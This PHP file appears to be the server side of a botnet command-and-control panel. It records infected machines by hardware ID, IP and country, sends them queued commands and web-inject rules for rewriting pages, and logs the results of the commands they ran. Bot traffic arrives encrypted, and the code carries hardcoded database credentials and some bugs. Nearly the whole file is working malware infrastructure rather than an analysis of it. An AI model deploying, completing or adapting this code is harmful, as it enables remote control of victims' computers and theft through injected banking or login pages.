<?php
	function connection(){
		$dsn = 'mysql:host=localhost;dbname=db'; 
		$username = 'root'; 
		$pwd='root'; 
		try {
			return new PDO($dsn, $username, $pwd);
		}
		catch (PDOException $e) {
			$error_message = $e->getMessage();
			echo "error";
			return "";
		}
	}
	function GetIP() {
    $ipaddress = "";
		if (isset($_SERVER['HTTP_CLIENT_IP']))
			$ipaddress = $_SERVER['HTTP_CLIENT_IP'];
		else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_X_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_X_FORWARDED'];
		else if(isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP']))
			$ipaddress = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
		else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
			$ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
		else if(isset($_SERVER['HTTP_FORWARDED']))
			$ipaddress = $_SERVER['HTTP_FORWARDED'];
		else if(isset($_SERVER['REMOTE_ADDR']))
			$ipaddress = $_SERVER['REMOTE_ADDR'];
		else
			$ipaddress = 'UNKNOWN';
    return $ipaddress;
	}
	function BotExist($hwid){
		$db = connection();
		$check = "SELECT * FROM `bots` WHERE `HWID` = :hwid";
		if($sth = $db->prepare($check)){
			$sth->bindParam(":hwid", $hwid);
			$sth->execute();
			if($sth->rowCount() > 0){
				return true;
			}
		}
		return false;
	}
	function AddBot($hwid, $os, $env, $sys){
		$db = connection();
		$add_new = "INSERT INTO `bots` (`HWID`, `OS`, `env`, `IP`, `sys`, `country`, `last_seen`) VALUES (:hwid, :os, :env, :IP, :sys, :country, CURRENT_TIMESTAMP)";
		if($sth = $db->prepare($add_new)){
			$ip = GetIP();
			$sth->bindParam(":hwid", $hwid);
			$sth->bindParam(":os", $os);
			$sth->bindParam(":env", $env);
			$sth->bindParam(":sys", $sys);
			$sth->bindParam(":IP", $ip);
			$sth->bindParam(":country", geoip_country_code_by_name($ip));
			$sth->execute();
			return true;
		}
		return false;
	}
	function UpdateBot($hwid){
		$db = connection();
		$update = "UPDATE `bots` SET `last_seen` = CURRENT_TIMESTAMP WHERE `hwid` = :hwid";
		if($sth = $db->prepare($update)){
			$sth->bindParam(":hwid", $hwid);
			$sth->execute();
			
		}
	}
	function UpdateCompleteTasks($hwid, $result, $id){
		$db = connection();
		$insert = "INSERT INTO `complete_tasks` (`cmd`, `result`, `botid`, `time_executed`) VALUES (:cmd, :result, :botid, CURRENT_TIMESTAMP)";
		$update = "UPDATE `tasks` SET `executed` = `executed` + 1 WHERE `id` = :id";
		$data = "SELECT * FROM `tasks` WHERE `id` = :id";
		if($sth = $db->prepare($update)){
			$sth->bindParam(":id", $id);
			$sth->execute();
		}
		$cmd = "";
		if($sth = $db->prepare($data)){
			$sth->bindParam(":id", $id);
			$sth->execute();
			
			while($row = $sth->fetch(PDO::FETCH_ASSOC)){
				$cmd = $row["cmd"];
			}
		}
		echo $cmd;
		if($sth = $db->prepare($insert)){
				$sth->bindParam(":cmd", $cmd);
				$sth->bindParam(":result", $result);
				$sth->bindParam(":botid", $hwid);
				$sth->execute();
				
		}
	}
	function AlreadyExecuted($cmd, $hwid){
		$db = connection();
		$already_executed = "SELECT * FROM `complete_tasks` WHERE `hwid` = :hwid AND `cmd` = :cmd";
		if($sth = $db->prepare($already_executed)){
			$sth->bindParam(":hwid", $hwid);
			$sth->bindParam(":cmd", $cmd);
			$sth->execute();
			if($sth->rowCount() > 0){
				return true;
			}
			return false;
		}
	}
	function GetWebInjects($hwid){
		$db = connection();
		$table = "SELECT * FROM `WebInjects` WHERE `status` = '1'";
        if($sth = $db->prepare($table)){
            $sth->execute();
			if($sth->rowCount() > 0){
				$commands = array("injects"=>array());
				while( $row = $sth->fetch(PDO::FETCH_ASSOC) ) {
					$commands["injects"][] = array($row["host"], $row["find"], $row["replace"]);
				}
				return htmlentities(json_encode($commands));
			}
		}
		return "";
	}
	function GetCmd($hwid){
		
		$db = connection();
		$table = "SELECT * FROM `tasks` WHERE `status` = '1' AND `executed` < `maxbots`;";
		
        if($sth = $db->prepare($table)){
			$sth->bindParam(':username', $session);
            $sth->execute();
			$commands = array("tasksnum" => "", "tasks"=>array());
            if($sth->rowCount() > 0 ){
				$commands["tasksnum"] = $sth->rowCount();
				while( $row = $sth->fetch(PDO::FETCH_ASSOC) ) {
					if(!AlreadyExecuted($row["cmd"], $hwid)){
						$commands["tasks"][] = array((int)$row["cmd_num"], $row["cmd"], (int)$row["id"]);
					}
				}
				return json_encode($commands);
            }
        }	
		return "";
	}
	
	
	
	$ENC_POST_DATA = array_values($_POST);
	$ENC_POST_DATA = $ENC_POST_DATA[0];
	if($ENC_POST_DATA != NULL){
		//base58.......
		$DEC_POST_DATA = Decrypt($ENC_POST_DATA);
		$post_params = array_values($DEC_POST_DATA);
		$post_params_count = count($post_params);
		if($post_params_count == 5){
			$encryption_key = $post_params[0];
			// AES Decrypt... 
			$hwid = AES_Decrypt($post_params[1], $encryption_key);
			$env = AES_Decrypt($post_params[2], $encryption_key);
			$sys = AES_Decrypt($post_params[3], $encryption_key);
			$os = AES_Decrypt($post_params[4], $encryption_key);
			
			if(BotExist($hwid)){
				UpdateBot($hwid);
				echo GetCmd($hwid);
			}
			else{
				if(AddBot($hwid, $env, $sys, $os)){
					echo GetCmd($hwid);
				}
			}
		}
		else if($post_params_count == 4){
			$encryption_key = $post_params[0];
			$hwid = $post_params[1];
			$result = $post_params[2];
			$cmd_id = $post_params[3];
			UpdateCompleteTasks($hwid, $result, $cmd_id);
		}
	}
?>